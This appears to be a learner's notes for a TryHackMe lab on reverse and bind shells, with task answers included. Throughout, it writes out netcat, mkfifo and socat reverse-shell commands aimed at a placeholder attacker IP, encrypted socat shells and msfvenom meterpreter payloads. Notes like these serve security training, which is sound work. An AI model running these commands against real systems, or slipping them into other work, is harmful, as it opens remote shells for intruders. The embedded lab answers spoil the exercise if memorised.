## 🔄 Reverse vs Bind Shells

### Reverse Shell
- Target **connects back** to your machine.
- You set up a **listener** on your attacking machine.
- **Advantage:** Bypasses inbound firewall rules.
- **Disadvantage:** Requires configuring your network (not an issue on THM).

**Example:**
```bash
# Attacker (listener)
sudo nc -lvnp 443

# Target (connects back)
nc <ATTACKER_IP> 443 -e /bin/bash
```

### Bind Shell
- Target **opens a listening port** with a shell attached.
- You **connect** to the target's port.
- **Advantage:** No configuration on your network.
- **Disadvantage:** Firewalls may block inbound connections.

**Example:**
```bash
# Target (listener)
nc -lvnp <PORT> -e /bin/bash

# Attacker (connects)
nc <TARGET_IP> <PORT>
```

### Interactive vs Non-Interactive
- **Interactive:** Can interact with programs (SSH, text editors). Standard CLI.
- **Non-Interactive:** Cannot run interactive programs. Most reverse/bind shells are non-interactive by default.

**Task 3 Answers:**
- Shell that connects back to your computer → `R` (Reverse)
- Shell from website injection likely interactive? → `N`
- Bind shell listener executed on → `T` (Target)

## 🔌 Netcat Shells

### Reverse Shell Listener
```bash
# Attacker listener
nc -lvnp <PORT>

# Options:
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = specify port
```

### Bind Shell Connection
```bash
# Attacker connecting to target bind shell
nc <TARGET_IP> <PORT>
```

### Netcat with -e (if available)
```bash
# Bind shell listener with -e
nc -lvnp <PORT> -e /bin/bash

# Reverse shell with -e
nc <ATTACKER_IP> <PORT> -e /bin/bash
```

### Netcat without -e (Linux)
```bash
# Bind shell (using named pipe)
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Reverse shell (using named pipe)
mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**Task 4 Answers:**
- Option to tell netcat to listen → `-l`
- Connect to bind shell on 10.10.10.11:8080 → `nc 10.10.10.11 8080`

## 🛠️ Shell Stabilisation Techniques

### Technique 1: Python (Linux only)
```bash
# Step 1: Spawn better shell
python -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Set terminal type
export TERM=xterm

# Step 3: Background shell (Ctrl+Z), then:
stty raw -echo; fg
```

### Technique 2: rlwrap
```bash
# Install
sudo apt install rlwrap

# Listener with rlwrap
rlwrap nc -lvnp <PORT>

# Then stabilise with stty trick (Ctrl+Z)
stty raw -echo; fg
```

### Technique 3: Socat (Linux target)
- Transfer socat binary to target via webserver, then use socat for stable shell.

### Change Terminal Size
```bash
# Check current rows/cols in another terminal
stty -a

# In reverse shell
stty rows <number>
stty cols <number>
```

**Task 5 Answers:**
- Change terminal size to 238 columns → `stty cols 238`
- Python3 webserver on port 80 → `sudo python3 -m http.server 80`

## 🔗 Socat Shells

### Basic Syntax
- Socat connects **two points** together (e.g., listening port and stdin).

### Reverse Shells
```bash
# Attacker listener (basic)
socat TCP-L:<PORT> -

# Target (Linux)
socat TCP:<ATTACKER_IP>:<PORT> EXEC:"bash -li"

# Target (Windows)
socat TCP:<ATTACKER_IP>:<PORT> EXEC:powershell.exe,pipes
```

### Bind Shells
```bash
# Target (Linux listener)
socat TCP-L:<PORT> EXEC:"bash -li"

# Target (Windows listener)
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# Attacker connect
socat TCP:<TARGET_IP>:<PORT> -
```

### Fully Stable TTY Reverse Shell (Linux only)
```bash
# Attacker listener (special)
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0

# Target (must have socat)
socat TCP:<ATTACKER_IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

**Flags explained:**
- `pty` – allocate pseudoterminal
- `stderr` – show error messages
- `sigint` – pass Ctrl+C through
- `setsid` – create new session
- `sane` – normalise terminal

**Task 6 Answer:**
- Socat listen on TCP port 8080 → `socat TCP-L:8080 -`

## 🔐 Encrypted Shells with Socat (OpenSSL)

### Generate Certificate
```bash
# Generate key and cert
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Merge into .pem
cat shell.key shell.crt > shell.pem
```

### Reverse Shell (Encrypted)
```bash
# Attacker listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Target connect back
socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 EXEC:/bin/bash
```

### Bind Shell (Encrypted)
```bash
# Target listener (PEM file must be on target)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Attacker connect
socat OPENSSL:<TARGET_IP>:<PORT>,verify=0 -
```

**Task 7 Answers:**
- OpenSSL listener with tty technique, port 53, PEM file "encrypt.pem" → `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0`
- Connect back from IP 10.10.10.5 → `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## ⚙️ Msfvenom Payloads

### Basic Syntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

### Common Options
- `-f <format>` – output format (exe, elf, py, aspx, war, etc.)
- `-o <file>` – output filename
- `LHOST=<IP>` – listener IP
- `LPORT=<port>` – listener port

### Payload Naming Conventions
```
<OS>/<arch>/<payload>
```

| Type | Naming | Example |
|------|--------|---------|
| Stageless | Uses `_` (underscore) | `windows/shell_reverse_tcp` |
| Staged | Uses `/` (forward slash) | `windows/shell/reverse_tcp` |
| Meterpreter | Includes "meterpreter" | `windows/x64/meterpreter/reverse_tcp` |

### Examples
```bash
# Windows 64-bit staged reverse shell
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.5 LPORT=4444

# Linux 64-bit staged meterpreter (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

# List all payloads
msfvenom --list payloads
```

**Task 9 Answers:**
- Symbol for stageless shell → `_`
- Staged meterpreter for 64-bit Linux, IP 10.10.10.5, port 443, ELF format → `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

## 🔑 Key Takeaways
- **Reverse shells** = target connects to you (more common).
- **Bind shells** = you connect to target (may be blocked by firewalls).
- **Netcat** is simple but unstable – stabilise with Python, rlwrap, or Socat.
- **Socat** provides stable, interactive shells but has harder syntax.
- **Msfvenom** generates payloads; naming convention indicates OS, arch, staged/stageless, and Meterpreter.
- **Multi/handler** is essential for staged payloads and Meterpreter shells.
- **Webshells** are useful when file upload is possible; PHP is common for Linux, PowerShell for Windows.
- **Always try to upgrade** to a full SSH/RDP session for better stability.
